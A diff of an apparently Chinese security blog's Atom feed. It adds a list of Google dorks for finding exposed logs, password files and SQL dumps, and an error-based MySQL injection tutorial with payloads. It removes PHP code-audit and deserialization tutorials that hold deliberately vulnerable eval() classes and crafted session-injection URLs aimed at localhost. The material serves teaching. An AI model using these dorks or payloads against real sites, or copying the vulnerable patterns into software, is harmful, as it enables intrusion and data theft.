@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-08-02T17:01:37.984Z</updated>
+  <updated>2017-09-11T03:54:14.232Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,102 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Google Hacking</title>
+    <link href="http://yoursite.com/2017/09/11/Google-Hacking/"/>
+    <id>http://yoursite.com/2017/09/11/Google-Hacking/</id>
+    <published>2017-09-11T03:48:41.000Z</published>
+    <updated>2017-09-11T03:54:14.232Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ol>
+<li>inurl:/secure/attachment/ filetype:log OR filetype:txt</li>
+<li>inurl:share.cgi?ssid=</li>
+<li>ext:log inurl:”/pgadmin”</li>
+<li>intitle:”Welcome to QNAP Turbo NAS”</li>
+<li>“m.zippyshare.com/“</li>
+<li>inurl:_vti_pvt/administrators.pwd</li>
+<li>“– Account dump” ext:sql -git</li>
+<li>inurl:zabbix.php AND intext:”Zabbix SIA”</li>
+<li>inurl:front/central.php</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;inurl:/secure/attachment/ filetype:log OR filetype:txt&lt;/li&gt;
+&lt;li&gt;
+    
+    </summary>
+    
+    
+      <category term="google" scheme="http://yoursite.com/tags/google/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>报错型sql注入原理研究学习</title>
+    <link href="http://yoursite.com/2017/09/11/%E6%8A%A5%E9%94%99%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://yoursite.com/2017/09/11/报错型sql注入原理研究学习/</id>
+    <published>2017-09-11T01:02:49.000Z</published>
+    <updated>2017-09-11T03:04:33.730Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这就让一些不法分子有机会从中获取敏感信息</p>
+<h3 id="通过floor报错"><a href="#通过floor报错" class="headerlink" title="通过floor报错"></a>通过floor报错</h3><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><figure class="highlight q"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">1</span>' <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>(<span class="keyword">select</span>(报错语句)) <span class="keyword">from</span> information_schema.tableslimit <span class="number">0</span>,<span class="number">1</span>))x <span class="keyword">from</span> imformation_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)a)--+</div></pre></td></tr></table></figure>
+<h4 id="公式解析"><a href="#公式解析" class="headerlink" title="公式解析"></a>公式解析</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">floor</span><span class="params">()</span></span>  是向下取整数</div><div class="line"></div><div class="line"><span class="function"><span class="title">rand</span><span class="params">()</span></span> 在<span class="number">0</span>和<span class="number">1</span>之间产生一个随机数</div><div class="line"></div><div class="line"><span class="function"><span class="title">rand</span><span class="params">(<span class="number">0</span>)</span></span>*<span class="number">2</span> 将取<span class="number">0</span>到<span class="number">2</span>的随机数</div><div class="line"></div><div class="line"><span class="function"><span class="title">floor</span><span class="params">(rand()</span></span>*<span class="number">2</span>) 有两条记录就会报错</div><div class="line"></div><div class="line"><span class="function"><span class="title">floor</span><span class="params">(rand(<span class="number">0</span>)</span></span>*<span class="number">2</span>) 记录需要<span class="number">3</span>条以上，且<span class="number">3</span>条以上必报错，返回的值是有规律的</div><div class="line"></div><div class="line"><span class="function"><span class="title">count</span><span class="params">(*)</span></span>是用来统计结果，相当于刷新一次结果</div><div class="line"></div><div class="line">group by 在对数据进行分组时会先看看虚表中有没有这个值，没有的话就插入  存在的话count(*)加<span class="number">1</span>，在使用group by 时floor(rand(<span class="number">0</span>)*<span class="number">2</span>)会被执行一次，若虚表不存在记录，插入虚表会在执行一次</div></pre></td></tr></table></figure>
+<h4 id="报错过程"><a href="#报错过程" class="headerlink" title="报错过程"></a>报错过程</h4><ol>
+<li>rand()用于产生一个0~1的随机数</li>
+<li>floor()向下取整</li>
+<li>rand()函数生成0~1的整数，向下取整，值是固定的’0’,将rand*2，得到的值就是不固定的，’0’或’1’</li>
+<li>concat()将符合条件的同一列中的不同列数据拼接，0x3a是十六进制的”:”</li>
+<li>将之前的rand()函数和floor()函数整合起来</li>
+<li>查询名字太长，起一个别名</li>
+<li>再次查询.information_schema.tables有多少表，会显示多少列</li>
+<li>group by 依据我们想要的规矩对结果进行分组</li>
+<li>count()统计元组的个数</li>
+<li>接着，多重复几次</li>
+</ol>
+<h4 id="floor-rand-2-与floor-rand-0-2-的不确定性与确定性"><a href="#floor-rand-2-与floor-rand-0-2-的不确定性与确定性" class="headerlink" title="floor(rand()2)与floor(rand(0)2)的不确定性与确定性"></a>floor(rand()<em>2)与floor(rand(0)</em>2)的不确定性与确定性</h4><pre><code>floor(rand()*2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)*2)就一定报错，由此可猜想floor(rand()*2)是比较随机的，不具备确定性因素，而floor(rand(0)*2)具备某方面的确定性。
+
+通过测试发现，floor(rand()*2)毫无规律可言，而floor(rand(0)*2）是有规律的
+
+那么mysql在遇到`select count（*）from tables group by x`这句话（实际就是建立虚拟表）
+1.先建立虚拟表，其中key是主键，不可重复
+2.开始查询数据，取数据库数据，然后查看虚拟表存在不，不存在则插入新纪录，存在则count(*)字段直接加，即如果key存在就+1，不存在话就新建一个key
+
+其实mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个“被计算多次”到底是什么意思，就是在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下floor(rand(0)*2)报错的过程就知道了，从0x04可以看到在一次多记录的查询过程中floor(rand(0)*2)的值是定性的，为`011011…`(记住这个顺序很重要)，报错实际上就是floor(rand(0)*2)被计算多次导致的。
+</code></pre><h4 id="完整过程"><a href="#完整过程" class="headerlink" title="完整过程"></a>完整过程</h4><ol>
+<li>查询前默认建立空虚拟表</li>
+<li>取第一条记录，执行floor(rand(0)<em>2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)</em>2)会被再计算一次，结果为1(第二次计算)，插入虚表，这是第一条记录</li>
+<li>查询第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1（第三次计算）,查询虚表，发现1的键值存在，所以floor(rand(0)</em>2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕</li>
+<li>查询第三条记录，再次计算floor(rand(0)<em>2），发现结果为0(第四次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的的数据，再插入数据时floor(rand(0)</em>2)被再次计算，作为虚表的主键，其值为1（第5次计算)，然而1这个主键已经存在与虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</li>
+</ol>
+<p>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>MySQL5.1.5版本中添加了对XML文档进行查询的修改的函数，分别是updatexml()和extracvalue()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; use test;</div><div class="line">Database changed</div><div class="line">mysql&gt; create table users</div><div class="line">    -&gt; (</div><div class="line">    -&gt; id int(3) NOT NULL AUTO_INCREMENT,</div><div class="line">    -&gt; username varchar(20) NOT NULL,</div><div class="line">    -&gt; password varchar(20) NOT NULL,PRIMARY KEY (id)</div><div class="line">    -&gt; );</div><div class="line">Query OK, 0 rows affected (1.74 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into users(id,username,password) values (1,&apos;admin&apos;,&apos;123456&apos;);</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
+<p>执行报错的payload:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="section">mysql&gt; select 1,2,3 and updatexml(1,concat(null,(select @@version),null),1);</span></div><div class="line">+---+---+-----------------------------------------------------------+</div><div class="line"><span class="section">| 1 | 2 | 3 and updatexml(1,concat(null,(select @@version),null),1) |</span></div><div class="line">+---+---+-----------------------------------------------------------+</div><div class="line"><span class="section">| 1 | 2 |                                                      NULL |</span></div><div class="line">+---+---+-----------------------------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>报错原因：</p>
+<ol>
+<li>updatexml第二个参数需要的是Xpath格式的字符串，我们输入的格式显然不符合，故故障由此报错</li>
+<li>uodatexml的最大长度是32位的，所以有局限（PS：但是应对大多的已经足够。）如果密码长度超过了32位就不会被显示出来。</li>
+</ol>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ol>
+<li><img src="http://wt7315.blog.51cto.com/10319657/1891458" alt=""></li>
+<li><img src="http://www.jinglingshu.org/?p=4507" alt=""></li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这就让一些不法分子有机会从中获取敏
+    
+    </summary>
+    
+    
+      <category term="sql" scheme="http://yoursite.com/tags/sql/"/>
+    
+  </entry>
   
   <entry>
     <title>域渗透神器Empire安装和简单使用</title>
@@ -1603,360 +1699,6 @@ print_r(glob(&quot;t*.php&quot;));//匹配t开头的
     
     
       <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计知识储备</title>
-    <link href="http://yoursite.com/2016/10/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87/"/>
-    <id>http://yoursite.com/2016/10/21/代码审计知识储备/</id>
-    <published>2016-10-21T04:37:16.000Z</published>
-    <updated>2016-10-29T12:58:33.392Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="一．-漏洞挖掘"><a href="#一．-漏洞挖掘" class="headerlink" title="一．    漏洞挖掘"></a>一．    漏洞挖掘</h3><p>1.1危险的来源数据<br>显示输入：所有提交的变量都被php保存在了一些数组里，PHP中可由用户用户输入的变量列表如下：</p>
-<ul>
-<li>$_SERVER –服务器和执行环境（是一个包含了诸如头信息，路径，以及脚本位置等等信息的数组</li>
-<li>$_FIES-HTTP文件上传变量</li>
-<li>$_ENV-环境变量（通过环境方式传递给当前脚本的变量数组）<br>getenv-获取一个环境变量  string getenv(string $varname)<br>在 php 的设置里有这么个选项register_globals,当这个选项为 on 的时候,上面出现的那些变量都会成为$GLOBALS 中的一员,在脚本中都不需要再取得就可以直接使用,并且以variables_order的顺序覆盖。</li>
-<li>$GLOBALS-引用全局作用域中可用的全部变量（一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li>
-<li><a id="more"></a>
-</li>
-</ul>
-<p>很多程序考虑到了register_globals=off的情况，于是在程序化的时候使用如下代码：</p>
-<pre><code>@extract(daddslashes($_POST));
-@extract(daddslashes($_GET));
-</code></pre><ul>
-<li>extract-从数组中将变量导入到当前的符号表中</li>
-</ul>
-<p>注释：把数组内容导入到符合表，比如$_COOLIE[“123”],那么经过他的非法字符过滤后，extract函数后变为$a=”123 ”这样子的模式。<br>daddslashes()-是addslashes()函数的加强版，可以对数组里面的每一个元素添加反斜杠</p>
-<p>这些代码起到了register_globals的作用，作用是将post和GET的内容释放出去做全局变量，但是危险可能更大。</p>
-<h4 id="二．隐式输入"><a href="#二．隐式输入" class="headerlink" title="二．隐式输入"></a>二．隐式输入</h4><ul>
-<li>用户传递的数据-&gt;数据库-&gt;程序代码处理-&gt;程序代码</li>
-</ul>
-<p>这个模式的意思就是用户输入的可能先进入了数据库，然后程序从数据库再取得这个输入送入某些危险的函数执行。</p>
-<p>与存储在数据库中类似的情况是，一些程序把用户的输入放入文件夹中，如缓冲文件，然后在必要的时候从里面取得，如果太过于相信这些地方的变量，这样还是导致问题的。</p>
-<h3 id="三．-变量覆盖"><a href="#三．-变量覆盖" class="headerlink" title="三．    变量覆盖"></a>三．    变量覆盖</h3><p>####常见的变量覆盖</p>
-<ul>
-<li><p>1.extract()-从数组中将变量导入到当前的符号表中</p>
-<p>  Int    extract(array    &amp;$var_array[,int$extract_type= EXTR_OVERWRITE [, string $prefix = NULL]] )</p>
-</li>
-</ul>
-<p>本函数用来将变量从数组中导入到当前的符号表中。检查每一个键名看是否可以作为一个合法的变量名，同时检查和符号表中已有的变量名的冲突。<br>$var_array一个关联数组。此函数将键名当作变量名，值作为变量的值<br>$extract_type:对待非法/数字和冲突的键名的方法将根据extract_type的参数决定</p>
-<ul>
-<li>2.parse_str()-将字符串解析成多个变量<br>void parse_str ( string $str [, array &amp;$arr ] )<br>如果str是URL传递的查询字符串（query string），则将它解析为变量并设置到当前作用域。  参数：str 输入的字符串  arr：若设置了第二个变量arr，变量将会以数组元素的形式存入到这个数组，作为代替</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;一．-漏洞挖掘&quot;&gt;&lt;a href=&quot;#一．-漏洞挖掘&quot; class=&quot;headerlink&quot; title=&quot;一．    漏洞挖掘&quot;&gt;&lt;/a&gt;一．    漏洞挖掘&lt;/h3&gt;&lt;p&gt;1.1危险的来源数据&lt;br&gt;显示输入：所有提交的变量都被php保存在了一些数组里，PHP中可由用户用户输入的变量列表如下：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;$_SERVER –服务器和执行环境（是一个包含了诸如头信息，路径，以及脚本位置等等信息的数组&lt;/li&gt;
-&lt;li&gt;$_FIES-HTTP文件上传变量&lt;/li&gt;
-&lt;li&gt;$_ENV-环境变量（通过环境方式传递给当前脚本的变量数组）&lt;br&gt;getenv-获取一个环境变量  string getenv(string $varname)&lt;br&gt;在 php 的设置里有这么个选项register_globals,当这个选项为 on 的时候,上面出现的那些变量都会成为$GLOBALS 中的一员,在脚本中都不需要再取得就可以直接使用,并且以variables_order的顺序覆盖。&lt;/li&gt;
-&lt;li&gt;$GLOBALS-引用全局作用域中可用的全部变量（一个包含了全部变量的全局组合数组。变量的名字就是数组的键。&lt;/li&gt;
-&lt;li&gt;
-    
-    </summary>
-    
-    
-      <category term="代码审计  PHP" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PPHP序列化以及反序列化</title>
-    <link href="http://yoursite.com/2016/10/18/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    <id>http://yoursite.com/2016/10/18/PHP序列化以及反序列化/</id>
-    <published>2016-10-18T08:42:28.000Z</published>
-    <updated>2016-11-11T15:11:50.485Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="什么是序列化以及反序列化"><a href="#什么是序列化以及反序列化" class="headerlink" title="什么是序列化以及反序列化"></a>什么是序列化以及反序列化</h3><p>序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来</p>
-<p>反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。</p>
-<a id="more"></a>
-<h4 id="PHP序列化方式"><a href="#PHP序列化方式" class="headerlink" title="PHP序列化方式"></a>PHP序列化方式</h4><p>php在序列化的时候会将相应的变量以对应的键值进行存储。</p>
-<ul>
-<li>实例化对象中自身的二次赋值</li>
-<li><p>对象的序列化 O:类名长度:”类名”:值:{}</p>
-<p>  &lt;?php</p>
-<p>  //1.要创建一个类的实例，必须要使用new关键字  2.用array()语言创建一个数组，它接受任意数量用逗号分割的  键（key） =&gt; 值（value）对</p>
-<p>  $o = new stdClass;</p>
-<p>  $o-&gt;foo = $o;</p>
-<p>  $s = serialize($o);</p>
-<p>  print $s;</p>
-<p>  //结果： O:8:”stdClass”:1:{s:3:”foo”;r:1;}</p>
-<p>  //对象的序列化 O:类名长度:”类名”:值:{}<br>  ?&gt;</p>
-</li>
-<li><p>数组中的引用(&amp;)的序列化</p>
-</li>
-<li><p>数组的序列化  array通常被序列化为： a:<n>:{<key1><key 2=""><value 2="">…<key n=""><value n="">}    <n>表示数组元素的个数，<key 1="">、<key 2="">……<key n=""> 表示数组下标，<value 1="">、<value 2="">……<value n=""> 表示与下标相对应的数组元素的值。</value></value></value></key></key></key></n></value></key></value></key></key1></n></p>
-<p>  &lt;?php<br>  $a = [“foo”];//数组里的字符串会被当做一个整体对待；</p>
-<p>  $a[1] =&amp; $a[0];//  数组中的引用（&amp;）的序列化</p>
-<p>  echo $a[1];</p>
-<p>  echo “——-“;</p>
-<p>  $s = serialize($a);</p>
-<p>  echo $s;</p>
-</li>
-</ul>
-<pre><code>//结果：  a:2:{i:0;s:3:&quot;foo&quot;;i:1;R:2;}
-//这里的R:2；部分意味着“指向第二个值”什么是第二个值？整个数组代表第一个值，(s:3:&quot;foo&quot;)代表第二个值
-//
-?&gt;
-</code></pre><h3 id="序列化键名对照表"><a href="#序列化键名对照表" class="headerlink" title="序列化键名对照表"></a>序列化键名对照表</h3><pre><code>数组中二次赋值（&amp;） ：            R；
-对象的二次赋值：                 r；
-NULL：                          N；
-ture：                         b:1;
-false:                        b:0;
-Long:                          i;
-Double:                        d;
-String:                        s/S;
-Class:                         C;
-Array:                         a;
-Object:                        O;
-变量的不同属性也有着不同的格式：
-public：                       key;
-protected：                    \0*\0key;
-private:                       \0key\0;
-</code></pre><h3 id="实例观察public-protected-private的区别"><a href="#实例观察public-protected-private的区别" class="headerlink" title="实例观察public/protected/private的区别"></a>实例观察public/protected/private的区别</h3><pre><code>&lt;?php
-class Test {
-public $public = 1;
-protected $protected = 2;
-private $private = 3;
-}
-$a = new Test();
-$s = serialize($a);
-//echo &quot;$s&quot;;
-var_dump($s);//var_dump()会返回变量的数据类型和值
-
-//结果：  string(81) &quot;O:4:&quot;Test&quot;:3:{s:6:&quot;public&quot;;i:1;s:12:&quot;\000*\000protected&quot;;i:2;s:13:&quot;\000Test\000private&quot;;i:3;}&quot;
-?&gt;
-</code></pre><p>###String对应的两个键：s与S<br>serialize()和unserialize()处理有着一些差异。PHP源码serialize()中没有相关序列化是以S为标识的，但是在unserialize中又有对S键的相关处理，相关部分源码</p>
-<pre><code>&lt;?  php
-case &apos;S&apos;: goto yy10;
-...
-yy10:
-yych = *(YYMARKER = ++YYCURSOR);
-if (yych == &apos;:&apos;) goto yy39;
-goto yy3;
-...
-yy39:
-yych = *++YYCURSOR;
-if (yych == &apos;+&apos;) goto yy40;
-if (yych &lt;= &apos;/&apos;) goto yy18;
-if (yych &lt;= &apos;9&apos;) goto yy41;
-goto yy18;
-
-case &apos;s&apos;: goto yy9;
-...
-yy9:
-yych = *(YYMARKER = ++YYCURSOR);
-if (yych == &apos;:&apos;) goto yy46;
-goto yy3;
-...
-yy46:
-yych = *++YYCURSOR;
-if (yych == &apos;+&apos;) goto yy47;
-if (yych &lt;= &apos;/&apos;) goto yy18;
-if (yych &lt;= &apos;9&apos;) goto yy48;
-goto yy18;
-...
-...
-?&gt;
-</code></pre><p>如果细心地话，会发现s和S就会发现两个键的处理方式是一模一样的</p>
-<h3 id="PHP中SESSION反序列化机制"><a href="#PHP中SESSION反序列化机制" class="headerlink" title="PHP中SESSION反序列化机制"></a>PHP中SESSION反序列化机制</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h4><pre><code>在php.ini中存在的三项配置项
-1.session.save_path=&quot;&quot; --设置session的存储路径
-2.session.save_handler=&quot;&quot; --设置用户自定义存储函数，若想使用PHP内置会话存储机制之外的可以使用本函数（数据库等方式）
-3.session.auto_start boolen --指定会话模块是否在请求开始时自动启动一个会话。默认为0
-4.session.serialize_handler string --定义用来序列化/反序列化的处理器名字。默认为php
-以上具体选项就是PHP中的session存储和序列话存储相关的选项
-</code></pre><p>在使用xampp组件安装中，上述的配置项的设置如下：</p>
-<pre><code>1.session.save_path=&quot;D:\phpstudy\tmp\tmp&quot;    表明所有的session文件都是存储在xampp/tmp下
-2.session.save_handler=&quot;file&quot;     表名session是以文件的方式进行存储的
-3.session.auto_start=0            表明默认不启动session
-4.session.serialize_handler=php   表明session的默认序列话引擎使用的是php序列话引擎
-</code></pre><p>在上述配置中，session.serialize_handler是用来设置session的序列话引擎，出除了默认的php引擎外还有其它的引擎，不同的引擎对应的session的存储方式不同</p>
-<pre><code>A：php_binary:存储方式，键名的长度对应的ASCII字符+键名+经过serialize函数序列化处理的值
-B：php存储的方式 ： 键名+竖线+经过serialize函数序列化处理的值
-C：php_serialize(php&gt;5.5.4)存储方式，经过serialize函数处理的值
-</code></pre><p>在php中默认使用的PHP引擎，如果修改为其他的引擎，只需要添加代码ini_set(“session.serialize_handler”,”需要设置的引擎”.示例代码如下：</p>
-<pre><code>&lt;?php
-ini_set(&quot;session.serialize_handler&quot;,&quot;php_serialize&quot;);
-session_start;
-//do something
-?&gt;
-</code></pre><h4 id="2-存储机制"><a href="#2-存储机制" class="headerlink" title="2 存储机制"></a>2 存储机制</h4><p>php中的session中的内容并不是放在内存中，而是以文件的方式来存储，存储的方式也是由配置项session.save_handler来确定，默认是以文件的形式存储。 文件的内容就是session值得序列化之后的内容。</p>
-<p>若我们的环境是xampp，在默认的配置下：</p>
-<pre><code>&lt;?php
-session_start();
-$_SESSION[&quot;name&quot;]=&quot;spoock&quot;;
-var_dump();
-?&gt;
-</code></pre><p>最后的session的存储和显示如下：<br><img src="http://i1.piimg.com/567571/d4ce737799055b86.png" alt=""><br>可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，而在xampp/tmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是name|s:6:”spoock”;。name是键值，s:6:”spoock”;是serialize(“spoock”)的结果。</p>
-<p>在php_serialize引擎中</p>
-<pre><code>&lt;?php
-ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);
-session_start();
-$_SESSION[&quot;name&quot;] = &quot;spoock&quot;;
-var_dump();
-?&gt;
-</code></pre><p>session文件中的内容 a:1:{s:4:”name”;s:6:”spoock”},a:1是使用php_serialize都会加上。同时使用php_serialize会将session中的key和value都会序列化。</p>
-<p>在php_binary引擎中：</p>
-<pre><code>&lt;?php
-ini_set(&quot;session.serialize_handler&quot;,&quot;php_binary&quot;)
-session_start();
-$_SESSION[&quot;name&quot;] = &quot;spoock&quot;
-var_dump();
-?&gt;
-</code></pre><p>session文件中的内容是EOTname:6:”spoock”;由于name的长度为4,4在ASCII表中对应的值就是EOT。根据php_binary的存储规则，最后就是EOTname:6:”spoock”；ASCII的值为4的字符无法在网页上面显示。</p>
-<h4 id="3-序列化的简单运用"><a href="#3-序列化的简单运用" class="headerlink" title="3 序列化的简单运用"></a>3 序列化的简单运用</h4><h5 id="补习php中-this-gt"><a href="#补习php中-this-gt" class="headerlink" title="补习php中$this-&gt;"></a>补习php中$this-&gt;</h5><p>$this的含义表示  实例后的具体对象</p>
-<p>我们一般先声明一个类，然后用这个类去实例化对象！<br>    &lt;?php<br>    class User{</p>
-<pre><code>    public $name;
-
-    function __getname(){//简言之定义一个类的方法
-        echo $this-&gt;name;
-    }
-}
-$user1 = new User();
-
-$user1-&gt;name = &apos;张三&apos;;
-
-$user1-&gt;getName();      //这里就会输出张三！
-
-$user2 = new User();
-
-$user2-&gt;name = &apos;李四&apos;;
-
-$user2-&gt;getName();      //这里会输出李四！
-?&gt;
-</code></pre><p>运用实例 22.php</p>
-<pre><code>&lt;?php
-class syclover{
-    var $func = &quot;&quot;;//var 定义类的属性为公共，var和public一个意思
-    function __construct(){
-        $this-&gt;func = &quot;phpinfo()&quot;;//$this 实例化后的具体的对象
-    }
-    function __wakeup(){
-        eval($this-&gt;func);//eval()函数把字符串当做PHP代码执行
-    }
-}
-unserialize($_GET[&quot;a&quot;]);
-
-?&gt;
-</code></pre><p>在第11行对传入的参数进行了序列化，我们可以传入一个特定的字符串，反序列化为syclover的一个实例，那么就可以执行eval()的方法。我们访问<br><a href="http://localhost/22.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo" target="_blank" rel="external">http://localhost/22.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo</a> “spoock”;”;}，反序列化得到的内容是：</p>
-<pre><code>objict(syclover)[0]
-    public &quot;func&quot; =&gt;string &apos;echo &quot;spoock&quot;;&apos;;
-</code></pre><p>最后页面输出的就是spoock，说明最后执行啦我们定义的echo “spoock”方法，这就是一个序列化漏洞的具体过程。</p>
-<h3 id="4-php-session触发过程的实际应用"><a href="#4-php-session触发过程的实际应用" class="headerlink" title="4 php session触发过程的实际应用"></a>4 php session触发过程的实际应用</h3><p>存在test01.php和test02.php两个文件所使用的session引擎不一样，即机制不同，我们可以在某一页面将数据序列化存放，在另一个页面进行反序列化访问，从而实现类。具体看一下代码<br>test01.php使用php_serialize来处理session</p>
-<pre><code>&lt;?php
-ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);
-session_start();
-$_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];
-?&gt;
-</code></pre><p>test02.php使用php来处理session</p>
-<pre><code>&lt;?php
-ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
-session_start();
-class lemon {
-var $hi;
-function __construct(){
-    $this-&gt;hi = &apos;phpinfo();&apos;;
-}
-
-    function __destruct() {
-         eval($this-&gt;hi);
-    }
-}
-?&gt;
-</code></pre><p>当访问的时候提交如下的数据：</p>
-<ul>
-<li><a href="http://localhost/test01.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo" target="_blank" rel="external">http://localhost/test01.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo</a> “spoock”;”;}</li>
-</ul>
-<p>此时传入的数据会按照php_serialize来进行序列化，此时访问<a href="http://localhost/test02.php，页面输出spoock成功执行了我们构造的数据，就会实例化lemon对象，最后会执行析构函数中的eval()方法。" target="_blank" rel="external">http://localhost/test02.php，页面输出spoock成功执行了我们构造的数据，就会实例化lemon对象，最后会执行析构函数中的eval()方法。</a></p>
-<h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><p>1.在实际进行渗透测试或者CTF中遇到session反序列化时，若发现session.upload_progress.enabled开着即等于1时，php会记录上传文件的进度，再上传时将信息保存在$_SESSION中。若文章测试使用如$_SESSION[“ryat”] = $_GET[“ryat”],然而很多时候没有这个条件，<br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">session.upload-progress.php</a>,php为我们提供了一个上传进度的数据（当一个上传在处理中，同时POST一个与INI中设置的session.upload_process.name同名变量时，上传进度可以在$_SESSION中获得）即$n = ini_get(“session.upload_progress.nmae);会把它存储在$_SESSION[“$n”]当中，这样我们就可以构造一个文件上传页，就可以成功写入session。</p>
-<p>一个上传进度数组的结构的例子</p>
-<pre><code>&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
- &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;ryat&quot; /&gt;
- &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
- &lt;input type=&quot;submit&quot; /&gt;
-&lt;/form&gt;
-</code></pre><p>2.在PHP中普通的传值赋值行为有一个例外就是碰到object时，在PHP中使用引用赋值的，除非明确使用了clone关键字来拷贝，PHP支持引用来赋值，使用”$var = &amp;$othervar;”语法。引用赋值意味着两个变量指向了一个变量，没有拷贝任何的东西。<br>举个简单地例子：</p>
-<pre><code>a = 1;
-b = &amp;a;
-a = a+1;
